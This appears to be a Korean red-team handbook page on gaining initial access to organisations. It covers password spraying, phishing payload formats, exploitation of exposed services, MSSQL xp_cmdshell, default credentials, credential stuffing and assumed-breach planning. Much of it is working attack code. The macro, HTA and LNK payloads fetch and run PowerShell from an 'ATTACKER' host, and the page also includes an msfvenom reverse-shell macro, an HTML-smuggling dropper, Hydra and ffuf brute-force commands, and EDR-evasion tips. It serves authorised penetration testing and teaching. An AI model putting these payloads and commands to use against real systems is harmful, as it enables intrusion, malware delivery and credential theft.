# 초기 침투

외부에서 내부 경계를 뚫는 관문. 피싱으로 사람 실수를 노리거나, 노출된 외부 서비스의 취약점을 찌르거나, 약한 credential 을 뚫어서 최초 접근을 만든다.

대부분의 레드팀 scope 에서 이 단계가 가장 "예술적" 인 편. OPSEC 이 박살나면 뒤에 다 물거품이 되기 때문에 신중하게 간다.

---

## Password Spray

계정 잠금(lockout)을 피하기 위해 하나의 password를 여러 계정에 시도하는 기법.

**반드시 password 정책(lockout threshold, observation window)을 먼저 확인한다.**

```bash
# password 정책 확인
nxc ldap <ip> -u '' -p '' --pass-pol
# 또는
rpcclient -N -U '' <ip> -c 'getdompwinfo'
```

```bash
# nxc를 이용한 Password Spray
nxc smb <ip> -u users.txt -p 'Spring2024!' --continue-on-success
nxc smb <ip> -u users.txt -p passwords.txt --continue-on-success

# SSH
nxc ssh <ip> -u users.txt -p passwords.txt

# Kerbrute (Kerberos pre-auth 기반, 로그 적음)
kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Password123!'
```

---

## Phishing

레드팀 작전에서 초기 침투 시 가장 많이 사용되는 기법 중 하나.

!!! tip "전용 문서"
    피싱 인프라 구축, GoPhish/Evilginx2 (AiTM MFA 우회), Consent Phishing, MFA Fatigue, Vishing, HTML Smuggling 등 **상세 시나리오와 OPSEC** 은 [Phishing / Vishing 전용 문서](phishing.md) 를 참고. 이 섹션은 payload 포맷에 국한된 요약.

### payload 유형

| 유형 | 설명 | 비고 |
|------|------|------|
| Office Macro (VBA) | Word/Excel 매크로 | Mark-of-the-Web 우회 필요 (2022~) |
| HTA | HTML Application | mshta.exe로 실행 |
| ISO/IMG | 디스크 이미지 | MotW 우회 (패치됨) |
| LNK | 바로가기 | 아이콘 위장, powershell 실행 |
| OneNote | .one 파일 | 2023년 이후 제한됨 |

### Office Macro payload

```vba
' VBA 매크로 예시 (Auto_Open 또는 Document_Open)
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"""
    Set shell = Nothing
End Sub
```

```bash
# msfvenom으로 매크로 생성
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vba-psh -o macro.vba
```

### HTA payload

```html
<html>
<head>
<script language="VBScript">
  Set obj = CreateObject("WScript.Shell")
  obj.Run "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"""
  self.close
</script>
</head>
</html>
```

### HTML Smuggling

JavaScript로 binary를 HTML 내부에 Base64로 임베딩하여 브라우저에서 재조립. 이메일 게이트웨이/proxy 우회에 효과적.

```html
<html>
<body>
<script>
var data = atob("TVqQAAMAAAAEAAAA...");  // Base64 encoded payload
var blob = new Blob([new Uint8Array([...data].map(c=>c.charCodeAt(0)))], {type:'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = "update.iso";
a.click();
</script>
</body>
</html>
```

### LNK payload

```powershell
# PowerShell로 악성 LNK 생성
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:TEMP\Important.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c powershell -ep bypass -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')`""
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
$Shortcut.Save()
```

### 이메일 인프라

- SMTP 서버 구축: GoPhish, MailHog
- 도메인 설정: SPF, DKIM, DMARC 레코드 필수
- 유사 도메인 등록 (typosquatting)

---

## 외부 서비스 취약점

인터넷에 노출된 서비스의 알려진 취약점(CVE)을 이용한 초기 침투.

```bash
# 웹 서버 버전 확인
curl -I http://<target>
whatweb http://<target>

# 알려진 취약점 검색
searchsploit <서비스명> <버전>
```

자주 target이 되는 서비스:

- VPN (Fortinet, Pulse Secure, Citrix)
- Exchange Server (ProxyShell, ProxyLogon)
- 웹 어플리케이션 (Jenkins, GitLab, Confluence)
- 파일 전송 (MOVEit, GoAnywhere)

---

## MSSQL 접근

MSSQL 서비스(1433 포트)가 노출된 경우 impacket으로 접근 가능하다.

```bash
# MSSQL 접근
impacket-mssqlclient <user>:<pass>@<ip>

# nxc로 MSSQL credential 확인
nxc mssql <ip> -u <user> -p <pass> --local-auth
```

접근 후 DB 질의를 통해 credential 등의 민감 정보를 추출할 수 있다.

```sql
-- 데이터베이스 목록
SELECT name FROM sys.databases;

-- 특정 DB의 테이블 목록
USE <dbname>;
SELECT name FROM sys.tables;

-- xp_cmdshell 활성화 (SA 권한 필요, 로그 발생)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

---

## Anonymous/Guest 접근

서비스별 익명 접근 가능 여부를 확인한다.

```bash
# FTP anonymous
ftp <ip>
# user: anonymous, pass: (빈 값 또는 아무 이메일)

# SMB null session
smbclient -L <ip> -N
smbmap -H <ip>

# LDAP anonymous bind
ldapsearch -x -H ldap://<ip> -b "dc=<domain>,dc=<tld>"

# RPC null session
rpcclient -N -U '' <ip>
```

---

## 기본 credential (Default Credentials)

```bash
# 웹 서비스 기본 계정 시도
admin:admin
admin:password
administrator:administrator
root:root
root:toor
sa:sa  # MSSQL

# 장비/서비스별 기본 계정 DB
# https://www.cirt.net/passwords
# https://default-password.info/
# https://datarecovery.com/rd/default-passwords/

# nxc로 기본 계정 테스트 (다수 서비스)
nxc smb <ip> -u admin -p admin
nxc ssh <ip> -u root -p root
nxc rdp <ip> -u administrator -p 'Password1!'
```

---

## Credential Stuffing

유출된 credential 목록을 대상 서비스에 자동으로 시도하는 기법.

```bash
# 유출 DB 확인 사이트
# https://haveibeenpwned.com (합법적 확인)

# Hydra
hydra -L users.txt -P leaked_passwords.txt <ip> ssh
hydra -L users.txt -P leaked_passwords.txt <ip> rdp
hydra -l admin -P leaked_passwords.txt <url> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"

# ffuf (웹 로그인)
ffuf -u <url>/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=FUZZ&pass=FUZ2Z" \
  -w users.txt:FUZZ -w passwords.txt:FUZ2Z \
  -fc 401,403
```

---

## Assumed Breach 시나리오

!!! tip "왜 필요한가"
    레드팀 서비스는 대부분 4~8주 일정. 초기 정찰/피싱/외부 공격이 2~3회 실패하면 **8주 내내 "초기 침투"만 평가**할 수는 없다. 따라서 일정 시점부터는 "이미 직원 한 명이 피싱에 당했다고 치고" 내부부터 시뮬레이션한다.

### 구성 요건

- target 기관 CISO가 **endpoint 1대**를 레드팀에 제공 (물리/가상 모두 가능)
- 제공 형태는 보통 다음 중 하나:
    1. VDI/Citrix session 크리덴셜
    2. 실제 도메인 가입 Windows 노트북 + 일반 직원 권한 계정
    3. VPN 계정 + 내부 네트워크 접근권
- EDR/AV/proxy/Proxy Auth/Conditional Access 등 **실제 직원과 동일한 보안 통제** 적용

### 평가 범위

| 단계 | 평가 포인트 |
|---|---|
| 거점 확보 | EDR 회피, Beacon 상시 유지, 방어자 Hunt 회피 |
| 권한 상승 | 로컬 Admin 획득 가능한가, LAPS/AppLocker/WDAC 효과 |
| 내부 정찰 | BloodHound/LDAP 정찰이 DLP/Honeytoken에 걸리는가 |
| 횡적 이동 | Tier 0 자산(DC/ADCS) 까지 몇 홉 / 며칠 걸리는가 |
| 지속성 | 블루팀이 격리 후에도 재진입 가능한가 |
| 탐지 대응 | MTTD / MTTR (평균 탐지/대응 시간) 측정 |

### 레드팀 OPSEC 체크리스트 (Assumed Breach)

- [ ] 제공받은 endpoint에서 **첫 Beacon 전까지** 로컬 정찰 최소화 (Defender/EDR 초기 관찰 윈도우 회피)
- [ ] C2 통신은 Jitter + Sleep 60~180s 이상, 업무시간 내 전송
- [ ] LDAP 정찰은 `-LoopDetection` / `ServicePrincipalName` 등 **빈도 낮은 속성** 중심, 단일 session에서 전체 도메인 dump 지양
- [ ] 티켓/hash 획득 후 24h 내 Tier 0 진입 시도는 대부분 탐지됨 → 며칠 간 정찰만 수행 후 이동
- [ ] 최종 미션 수행 직전, 블루팀에게 사전 고지(High-Impact Only Card)

### 참고

- lifecycle 정의: [레드팀이란 (xn--hy1b43d247a.com)](https://www.xn--hy1b43d247a.com/what-even-is-redteam)
- TIBER-EU Framework: <https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html>
